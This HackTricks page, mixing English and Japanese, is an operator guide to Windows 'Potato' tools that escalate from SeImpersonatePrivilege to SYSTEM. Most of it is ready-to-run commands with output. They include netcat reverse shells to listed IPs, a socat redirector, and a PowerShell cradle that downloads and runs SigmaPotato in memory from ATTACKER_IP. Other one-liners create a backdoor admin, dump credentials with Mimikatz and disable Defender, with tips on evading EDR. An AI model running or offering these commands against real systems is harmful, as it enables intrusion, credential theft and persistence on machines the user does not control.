# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato は Windows Server 2019 と Windows 10 build 1809 以降では動作しません。** しかし、[**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**、**[**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**、**[**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**、**[**GodPotato**](https://github.com/BeichenDream/GodPotato)**、**[**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**、**[**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** は同じ権限を利用して **`NT AUTHORITY\SYSTEM`** レベルのアクセスを得るために使用できます。こちらの [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) は `PrintSpoofer` ツールについて詳細に解説しており、JuicyPotato が動作しない Windows 10 や Server 2019 ホストでインパーソネーション権限を悪用する方法を説明しています。

> [!TIP]
> 2024–2025 年にかけて頻繁にメンテナンスされている現代的な代替手段として SigmaPotato（GodPotato のフォーク）があり、in-memory/.NET reflection の利用や拡張された OS サポートを追加しています。下記のクイック使用法と References のリポジトリを参照してください。

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Requirements and common gotchas

All the following techniques rely on abusing an impersonation-capable privileged service from a context holding either of these privileges:

- SeImpersonatePrivilege (most common) or SeAssignPrimaryTokenPrivilege
- High integrity is not required if the token already has SeImpersonatePrivilege (typical for many service accounts such as IIS AppPool, MSSQL, etc.)

Check privileges quickly:
```cmd
whoami /priv | findstr /i impersonate
```
Operational notes:

- If your shell runs under a restricted token lacking SeImpersonatePrivilege (common for Local Service/Network Service in some contexts), regain the account’s default privileges using FullPowers, then run a Potato. Example: `FullPowers.exe -c "cmd /c whoami /priv" -z`  
  シェルが SeImpersonatePrivilege を持たない制限されたトークンで動作している場合（特定の状況で Local Service/Network Service に多い）、FullPowers を使ってアカウントのデフォルト権限を回復してから Potato を実行してください。例: `FullPowers.exe -c "cmd /c whoami /priv" -z`

- PrintSpoofer needs the Print Spooler service running and reachable over the local RPC endpoint (spoolss). In hardened environments where Spooler is disabled post-PrintNightmare, prefer RoguePotato/GodPotato/DCOMPotato/EfsPotato.  
  PrintSpoofer は Print Spooler サービスが稼働しており、ローカル RPC エンドポイント (spoolss) に到達可能である必要があります。PrintNightmare の対策で Spooler が無効化されている強化環境では、RoguePotato/GodPotato/DCOMPotato/EfsPotato を優先してください。

- RoguePotato requires an OXID resolver reachable on TCP/135. If egress is blocked, use a redirector/port-forwarder (see example below). Older builds needed the -f flag.  
  RoguePotato は TCP/135 経由で到達可能な OXID resolver を必要とします。egress がブロックされている場合は、redirector/port-forwarder を使用してください（下の例を参照）。古いビルドは -f フラグが必要でした。

- EfsPotato/SharpEfsPotato abuse MS-EFSR; if one pipe is blocked, try alternative pipes (lsarpc, efsrpc, samr, lsass, netlogon).  
  EfsPotato/SharpEfsPotato は MS-EFSR を悪用します。あるパイプが遮断されている場合は、代替のパイプ（lsarpc、efsrpc、samr、lsass、netlogon）を試してください。

- Error 0x6d3 during RpcBindingSetAuthInfo typically indicates an unknown/unsupported RPC authentication service; try a different pipe/transport or ensure the target service is running.  
  RpcBindingSetAuthInfo 実行時のエラー 0x6d3 は通常、未知または非対応の RPC 認証サービスを示します。別のパイプ/トランスポートを試すか、ターゲットサービスが稼働していることを確認してください。

- “Kitchen-sink” forks such as DeadPotato bundle extra payload modules (Mimikatz/SharpHound/Defender off) which touch disk; expect higher EDR detection compared to the slim originals.  
  DeadPotato のような「キッチンシンク」派生版は、ディスクにアクセスする追加のペイロードモジュール（Mimikatz/SharpHound/Defender off）を同梱しています。そのため、スリムなオリジナルと比べて EDR に検出されやすくなります。

## クイックデモ

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
注意事項:
- 現在の console で対話型プロセスを起動するには -i を使用し、ワンライナーを実行するには -c を使用します。
- Spooler サービスが必要です。無効化されている場合は失敗します。

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
outbound 135 がブロックされている場合は、redirector 上で socat を使って OXID resolver を pivot してください:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato は、2022年末に公開された新しい COM 悪用プリミティブで、Spooler/BITS の代わりに **PrintNotify** サービスを標的にします。バイナリは PrintNotify COM サーバーをインスタンス化し、偽の `IUnknown` を差し込み、`CreatePointerMoniker` を通じて権限のあるコールバックを発生させます。PrintNotify サービス（**SYSTEM** として実行）が接続してくると、そのプロセスは返された token を複製し、完全な権限で指定された payload を起動します。

Key operational notes:

* Works on Windows 10/11 and Windows Server 2012–2022 as long as the Print Workflow/PrintNotify service is installed (it is present even when the legacy Spooler is disabled post-PrintNightmare).
* Requires the calling context to hold **SeImpersonatePrivilege** (typical for IIS APPPOOL, MSSQL, and scheduled-task service accounts).
* Accepts either a direct command or an interactive mode so you can stay inside the original console. Example:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Because it is purely COM-based, no named-pipe listeners or external redirectors are required, making it a drop-in replacement on hosts where Defender blocks RoguePotato’s RPC binding.

Operators such as Ink Dragon fire PrintNotifyPotato immediately after gaining ViewState RCE on SharePoint to pivot from the `w3wp.exe` worker to SYSTEM before installing ShadowPad.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
ヒント: もし1つの pipe が失敗するか EDR によってブロックされる場合は、他のサポートされている pipes を試してください:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
注意:
- SeImpersonatePrivilege が存在する場合、Windows 8/8.1–11 および Server 2012–2022 で動作します。

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato は、デフォルトで RPC_C_IMP_LEVEL_IMPERSONATE を使用するサービス DCOM オブジェクトをターゲットにした2つのバリアントを提供します。提供されている binaries をビルドするか使用して、コマンドを実行します:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (updated GodPotato fork)

SigmaPotato は .NET reflection 経由の in-memory execution や PowerShell reverse shell helper といった現代的な便利機能を追加します。
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
2024–2025 ビルド (v1.2.x) の追加特典:

- Built-in reverse shell flag `--revshell` and removal of the 1024-char PowerShell limit so you can fire long AMSI-bypassing payloads in one go.
- Reflection-friendly syntax (`[SigmaPotato]::Main()`)、および `VirtualAllocExNuma()` を使った簡易的な AV evasion トリックで単純なヒューリスティックを混乱させます。
- PowerShell Core 環境向けに .NET 2.0 対応でコンパイルされた別の `SigmaPotatoCore.exe`。

### DeadPotato (2024 GodPotato rework with modules)

DeadPotato は GodPotato の OXID/DCOM impersonation chain を維持しつつ、post-exploitation ヘルパーを組み込んでいるため、オペレーターは追加ツールなしで即座に SYSTEM を取得し、persistence/collection を実行できます。

Common modules (all require SeImpersonatePrivilege):

- `-cmd "<cmd>"` — spawn arbitrary command as SYSTEM.
- `-rev <ip:port>` — quick reverse shell.
- `-newadmin user:pass` — create a local admin for persistence.
- `-mimi sam|lsa|all` — drop and run Mimikatz to dump credentials (touches disk, noisy).
- `-sharphound` — run SharpHound collection as SYSTEM.
- `-defender off` — flip Defender real-time protection (very noisy).

ワンライナーの例：
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
余分なバイナリを同梱しているため、AV/EDRによる検知フラグが増えることを想定してください。ステルスが重要な場合は、よりスリムな GodPotato/SigmaPotato を使用してください。

## 参考文献

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
